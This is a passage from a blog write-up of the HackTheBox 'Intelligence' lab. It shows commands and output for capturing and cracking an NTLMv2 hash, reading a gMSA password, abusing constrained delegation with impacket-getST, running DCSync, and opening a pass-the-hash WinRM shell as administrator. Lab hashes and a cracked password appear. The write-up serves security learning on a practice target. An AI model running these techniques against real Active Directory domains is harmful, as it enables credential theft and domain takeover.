</span></span><span class=line><span class=cl>  <span class=nv>res</span> <span class=o>=</span> dnsresolver.query<span class=o>(</span>zone, <span class=s1>&#39;SOA&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> Adding new record
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> LDAP operation completed successfully
</span></span></code></pre></div><p>At the same time, I&rsquo;ll also start the Responder. Shortly after it runs, the Ted.Graves hash appear.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «krbrelayx» «10.10.14.75» git:<span class=o>(</span>master<span class=o>)</span> 
</span></span><span class=line><span class=cl>$ sudo responder -I tun0
</span></span><span class=line><span class=cl>                                         __
</span></span><span class=line><span class=cl>  .----.-----.-----.-----.-----.-----.--<span class=p>|</span>  <span class=p>|</span>.-----.----.
</span></span><span class=line><span class=cl>  <span class=p>|</span>   _<span class=p>|</span>  -__<span class=p>|</span>__ --<span class=p>|</span>  _  <span class=p>|</span>  _  <span class=p>|</span>     <span class=p>|</span>  _  <span class=o>||</span>  -__<span class=p>|</span>   _<span class=p>|</span>
</span></span><span class=line><span class=cl>  <span class=p>|</span>__<span class=p>|</span> <span class=p>|</span>_____<span class=p>|</span>_____<span class=p>|</span>   __<span class=p>|</span>_____<span class=p>|</span>__<span class=p>|</span>__<span class=p>|</span>_____<span class=o>||</span>_____<span class=p>|</span>__<span class=p>|</span>
</span></span><span class=line><span class=cl>                   <span class=p>|</span>__<span class=p>|</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>           NBT-NS, LLMNR <span class=p>&amp;</span> MDNS Responder 3.0.6.0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  Author: Laurent Gaffie <span class=o>(</span>laurent.gaffie@gmail.com<span class=o>)</span>
</span></span><span class=line><span class=cl>  To <span class=nb>kill</span> this script hit CTRL-C
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Listening <span class=k>for</span> events...                                                                                                          
</span></span><span class=line><span class=cl><span class=o>[</span>HTTP<span class=o>]</span> NTLMv2 Client   : 10.10.10.248
</span></span><span class=line><span class=cl><span class=o>[</span>HTTP<span class=o>]</span> NTLMv2 Username : intelligence<span class=se>\T</span>ed.Graves
</span></span><span class=line><span class=cl><span class=o>[</span>HTTP<span class=o>]</span> NTLMv2 Hash     : Ted.Graves::intelligence:4cca110e84677c33:3A689C04E699DF8F6E1B16A599576ABA:0101000000000000E700D4082B7AD7012AF2C454A91E32400000000002000800340039003100540001001E00570049004E002D00500032003300360049003800390058003100530046000400140034003900310054002E004C004F00430041004C0003003400570049004E002D00500032003300360049003800390058003100530046002E0034003900310054002E004C004F00430041004C000500140034003900310054002E004C004F00430041004C000800300030000000000000000000000000200000AF0854B4C9903CBE8251A0173036E36C4E1F4A5399C97563C3922EC707733A310A0010000000000000000000000000000000000009003C0048005400540050002F007700650062002D00690061006D0066002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
</span></span></code></pre></div><h4 id=cracking-the-hash>Cracking the Hash<a class=anchor aria-hidden=true href=#cracking-the-hash>#</a></h4><p>The hash can be cracked with <code>hashcat</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ ./hashcat.exe -m <span class=m>5600</span> hashes/intelligence-ted.graves.hash ../../rockyou.txt -O                     ✘ INT
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>TED.GRAVES::intelligence:4cca110e84677c33:3a689c04e699df8f6e1b16a599576aba:..<span class=o>[</span>SNIP<span class=o>]</span>..:Mr.Teddy
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Session..........: hashcat
</span></span><span class=line><span class=cl>Status...........: Cracked
</span></span><span class=line><span class=cl>Hash.Name........: NetNTLMv2
</span></span><span class=line><span class=cl>Hash.Target......: TED.GRAVES::intelligence:4cca110e84677c33:3a689c04e...000000
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><p>The credentials are valid</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ crackmapexec smb 10.10.10.248 -u <span class=s1>&#39;Ted.Graves&#39;</span> -p <span class=s1>&#39;Mr.Teddy&#39;</span> 
</span></span><span class=line><span class=cl>SMB         10.10.10.248    <span class=m>445</span>    DC               <span class=o>[</span>*<span class=o>]</span> Windows 10.0 Build <span class=m>17763</span> x64 <span class=o>(</span>name:DC<span class=o>)</span> <span class=o>(</span>domain:intelligence.htb<span class=o>)</span> <span class=o>(</span>signing:True<span class=o>)</span> <span class=o>(</span>SMBv1:False<span class=o>)</span>
</span></span></code></pre></div><h3 id=shell-as-administrator>Shell as Administrator<a class=anchor aria-hidden=true href=#shell-as-administrator>#</a></h3><h4 id=enumeration-with-bloodhound>Enumeration with BloodHound<a class=anchor aria-hidden=true href=#enumeration-with-bloodhound>#</a></h4><p>Even with user <code>Ted.Graves</code>, I still have no shell access. From here, I&rsquo;ll use BloodHound to explore more about the object relationships. I&rsquo;ll use the Python ingestor.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «BloodHound.py» «10.10.14.75» git:<span class=o>(</span>master<span class=o>)</span> 
</span></span><span class=line><span class=cl>$ python3 bloodhound.py -c All -u <span class=s1>&#39;Ted.Graves&#39;</span> -p <span class=s1>&#39;Mr.Teddy&#39;</span> -d intelligence.htb -dc dc.intelligence.htb -ns 10.10.10.248
</span></span><span class=line><span class=cl>INFO: Found AD domain: intelligence.htb
</span></span><span class=line><span class=cl>INFO: Connecting to LDAP server: dc.intelligence.htb
</span></span><span class=line><span class=cl>INFO: Found <span class=m>1</span> domains
</span></span><span class=line><span class=cl>INFO: Found <span class=m>1</span> domains in the forest
</span></span><span class=line><span class=cl>INFO: Found <span class=m>2</span> computers
</span></span><span class=line><span class=cl>INFO: Connecting to LDAP server: dc.intelligence.htb
</span></span><span class=line><span class=cl>INFO: Found <span class=m>42</span> users
</span></span><span class=line><span class=cl>INFO: Found <span class=m>54</span> groups
</span></span><span class=line><span class=cl>INFO: Found <span class=m>0</span> trusts
</span></span><span class=line><span class=cl>INFO: Starting computer enumeration with <span class=m>10</span> workers
</span></span><span class=line><span class=cl>INFO: Querying computer: svc_int.intelligence.htb
</span></span><span class=line><span class=cl>INFO: Querying computer: dc.intelligence.htb
</span></span><span class=line><span class=cl>INFO: Skipping enumeration <span class=k>for</span> svc_int.intelligence.htb since it could not be resolved.
</span></span><span class=line><span class=cl>INFO: Done in 00M 21S
</span></span></code></pre></div><p>Using the pre-built analytics queries “Shortest Path from Owned Principal” reveals that user <code>Ted.Graves</code> has <code>readGMSAPassword</code> permission on a service account called <code>SVC_INT</code>. And the service account has <code>AllowedToDelegate</code> permission (constrained delegation) on the DC/Machine.</p><p><div class=img-container><img src=imgs/image-20210716110136841.png alt=image-20210716110136841></div></p><h4 id=read-svc_init-password>Read SVC_INIT Password<a class=anchor aria-hidden=true href=#read-svc_init-password>#</a></h4><p>According to the help feature, <code>readGMSAPassword</code> allows you to retrieve GMSA (Group Managed Service Account) password. I&rsquo;ll also note that the password might be changed after some periods just like computer account (default 30 days).</p><p><div class=img-container><img src=imgs/image-20210716110314851.png alt=image-20210716110314851></div></p><p>The author of this box has already created a tool for abusing this permission: <a href=https://github.com/micahvandeusen/gMSADumper/blob/main/gMSADumper.py>gMSADumper.py</a>. Running it retuns the password of <code>svc_int$</code> in the form of NT hash.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «exploits» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ ./gMSADumper.py -u <span class=s1>&#39;Ted.Graves&#39;</span> -p <span class=s1>&#39;Mr.Teddy&#39;</span> -d intelligence.htb
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Users or groups who can <span class=nb>read</span> password <span class=k>for</span> svc_int$:
</span></span><span class=line><span class=cl> &gt; DC$
</span></span><span class=line><span class=cl> &gt; itsupport
</span></span><span class=line><span class=cl>svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2
</span></span></code></pre></div><p>Since the password is managed by the DC, I don&rsquo;t have to try to crack it.</p><h4 id=abusing-constrained-delegation---silver-ticket>Abusing Constrained Delegation -> Silver Ticket<a class=anchor aria-hidden=true href=#abusing-constrained-delegation---silver-ticket>#</a></h4><p><a href=https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation>This site</a> explains what a constrained delegation is:</p><blockquote><p>If you have compromised a user account or a computer (machine account) that has kerberos constrained delegation enabled, it&rsquo;s possible to impersonate any domain user (including administrator) and authenticate to a service that the user account is trusted to delegate to.</p></blockquote><p>In this case, the service account <code>svc_int</code> can impersonate the domain admin and authenticate to <code>WWW/DC.INTELLIGENCE.HTB</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «exploits» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ ldapsearch -LLL -D <span class=s2>&#34;Ted.Graves@intelligence.htb&#34;</span> -w <span class=s2>&#34;Mr.Teddy&#34;</span> -x -h 10.10.10.248 -b <span class=s2>&#34;CN=svc_int,CN=Managed ServiceDC=intelligence,DC=htb&#34;</span> 
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>msDS-AllowedToDelegateTo: WWW/dc.intelligence.htb
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><p>With that, I can abuse this permission and perform <a href=https://attack.mitre.org/techniques/T1558/002/>Silver Ticket</a> attack, I&rsquo;ll use <code>impacket-getST</code> tool, but the result says clock skew too great.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «exploits» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ impacket-getST <span class=s1>&#39;intelligence.htb/svc_int$&#39;</span>  -spn <span class=s1>&#39;WWW\dc.intelligence.htb&#39;</span> -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate administrator
</span></span><span class=line><span class=cl>Impacket v0.9.22 - Copyright <span class=m>2020</span> SecureAuth Corporation
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Getting TGT <span class=k>for</span> user
</span></span><span class=line><span class=cl>Kerberos SessionError: KRB_AP_ERR_SKEW<span class=o>(</span>Clock skew too great<span class=o>)</span>
</span></span></code></pre></div><p>To resolve that, I&rsquo;ll need to synchronize my machine time with the DC. This can be done with <code>ntpdate</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ sudo apt install ntpdate <span class=o>&amp;&amp;</span> sudo ntpdate 10.10.10.248
</span></span><span class=line><span class=cl><span class=m>18</span> Jul 14:57:39 ntpdate<span class=o>[</span>63324<span class=o>]</span>: adjust <span class=nb>time</span> server 10.10.10.248 offset +0.001305 sec
</span></span></code></pre></div><p>On the next attempt, I have obtained the admin ticket (TGS).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «intelligence» «10.10.14.75»
</span></span><span class=line><span class=cl>$ impacket-getST -spn <span class=s1>&#39;WWW/dc.intelligence.htb&#39;</span> -impersonate administrator -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -dc-ip 10.10.10.248 intelligence.htb/svc_int<span class=se>\$</span>
</span></span><span class=line><span class=cl>Impacket v0.9.22 - Copyright <span class=m>2020</span> SecureAuth Corporation
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Getting TGT <span class=k>for</span> user
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Impersonating administrator
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>     Requesting S4U2self
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>     Requesting S4U2Proxy
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving ticket in administrator.ccache
</span></span></code></pre></div><h4 id=dcsync>DCSync<a class=anchor aria-hidden=true href=#dcsync>#</a></h4><p>Although the admin ticket was actually requested for <code>WWW\dc.intelligence.htb</code>, it actually can be used for other service, like DRS (Directory Replication Service) for DCSync attack.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ <span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>administrator.ccache <span class=o>&amp;&amp;</span> impacket-secretsdump -k -no-pass dc.intelligence.htb -just-dc-user administrator
</span></span><span class=line><span class=cl>Impacket v0.9.22 - Copyright <span class=m>2020</span> SecureAuth Corporation
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Dumping Domain Credentials <span class=o>(</span>domain<span class=se>\u</span>id:rid:lmhash:nthash<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Using the DRSUAPI method to get NTDS.DIT secrets
</span></span><span class=line><span class=cl>Administrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3:::
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Kerberos keys grabbed
</span></span><span class=line><span class=cl>Administrator:aes256-cts-hmac-sha1-96:75dcc603f2d2f7ab8bbd4c12c0c54ec804c7535f0f20e6129acc03ae544976d6
</span></span><span class=line><span class=cl>Administrator:aes128-cts-hmac-sha1-96:9091f2d145cb1a2ea31b4aca287c16b0
</span></span><span class=line><span class=cl>Administrator:des-cbc-md5:2362bc3191f23732
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Cleaning up...
</span></span></code></pre></div><h4 id=shell-access>Shell Access<a class=anchor aria-hidden=true href=#shell-access>#</a></h4><p>With the administrator hash, I can use WinRM to get a shell access</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «intelligence» «10.10.14.75» 
</span></span><span class=line><span class=cl>$ evil-winrm -i 10.10.10.248 -u <span class=s1>&#39;administrator&#39;</span> -H <span class=s1>&#39;9075113fe16cf74f7c0f9b27e882dad3&#39;</span>        
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Evil-WinRM shell v2.4
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Info: Establishing connection to remote endpoint
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>ocuments&gt; hostname
</span></span><span class=line><span class=cl>dc
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>ocuments&gt; ipconfig
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Windows IP Configuration
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Ethernet adapter Ethernet0 2:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   Connection-specific DNS Suffix  . :
</span></span><span class=line><span class=cl>   IPv6 Address. . . . . . . . . . . : dead:beef::a57a:d94f:fa40:87e6
</span></span><span class=line><span class=cl>   Link-local IPv6 Address . . . . . : fe80::a57a:d94f:fa40:87e6%6
</span></span><span class=line><span class=cl>   IPv4 Address. . . . . . . . . . . : 10.10.10.248
</span></span><span class=line><span class=cl>   Subnet Mask . . . . . . . . . . . : 255.255.254.0
</span></span><span class=line><span class=cl>   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
</span></span><span class=line><span class=cl>                                       10.10.10.2
</span></span></code></pre></div><div class=post-references><h2>References</h2><ul><li><a href=https://www.onsecurity.io/blog/abusing-kerberos-from-linux/>https://www.onsecurity.io/blog/abusing-kerberos-from-linux/</a></li><li><a href=https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation>https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation</a></li></ul></div></div></div><div class=post-meta-bottom></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/windows/>Windows</a></li><li><a href=https://fahmifj.github.io/tags/active-directory/>Active-Directory</a></li><li><a href=https://fahmifj.github.io/tags/silver-ticket/>Silver-Ticket</a></li><li><a href=https://fahmifj.github.io/tags/dns/>DNS</a></li><li><a href=https://fahmifj.github.io/tags/responder/>Responder</a></li><li><a href=https://fahmifj.github.io/tags/gmsa/>gMSA</a></li><li><a href=https://fahmifj.github.io/tags/constrained-delegation/>Constrained-delegation</a></li><li><a href=https://fahmifj.github.io/tags/dcsync/>DCSync</a></li><li><a href=https://fahmifj.github.io/tags/bloodhound/>BloodHound</a></li><li><a href=https://fahmifj.github.io/tags/hashcat/>Hashcat</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Intelligence on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Intelligence&amp;url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fintelligence%2f&amp;hashtags=Windows%2cActive-Directory%2cSilver-Ticket%2cDNS%2cResponder%2cgMSA%2cConstrained-delegation%2cDCSync%2cBloodHound%2cHashcat"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Intelligence on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fintelligence%2f&amp;title=HackTheBox%20-%20Intelligence&amp;summary=HackTheBox%20-%20Intelligence&amp;source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fintelligence%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Intelligence on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fintelligence%2f&title=HackTheBox%20-%20Intelligence"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Intelligence on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fintelligence%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Intelligence on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Intelligence%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fintelligence%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Intelligence on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Intelligence&amp;url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fintelligence%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><div class=footer-wrapper><div class=footer-right><span class=copyright>&copy; 2023&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span></div><div class=footer-mid><span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span>
&nbsp;·&nbsp;
<span class=support><a href=https://fahmifj.github.io/about#support>support</a></span>
&nbsp;·&nbsp;
<span class=rss><a href=https://fahmifj.github.io/index.xml>rss</a></span></div><div class=footer-left><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a></span></div></div></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.getElementsByClassName("profile-img")[0].addEventListener("click",()=>{location.href=location.origin+"/about"})</script></body></html>